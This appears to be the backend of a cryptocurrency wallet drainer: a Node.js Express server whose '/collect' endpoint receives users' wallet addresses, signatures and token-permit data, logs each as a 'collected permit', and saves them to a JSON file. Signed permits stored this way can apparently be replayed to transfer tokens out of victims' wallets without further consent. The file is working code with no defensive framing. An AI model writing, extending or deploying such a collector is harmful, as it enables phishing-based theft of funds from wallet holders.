const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

const DATA_FILE = path.resolve(__dirname, "collected_permits.json");

// Helper to append collected permits
function savePermit(data) {
  let permits = [];
  try {
    permits = JSON.parse(fs.readFileSync(DATA_FILE));
  } catch {}
  permits.push(data);
  fs.writeFileSync(DATA_FILE, JSON.stringify(permits, null, 2));
}

app.post("/collect", (req, res) => {
  const { chainId, userAddress, signature, permitData } = req.body;
  console.log(`[+] Collected permit from ${userAddress} on chain ${chainId}`);

  savePermit({ chainId, userAddress, signature, permitData, collectedAt: new Date().toISOString() });
  res.json({ status: "ok" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
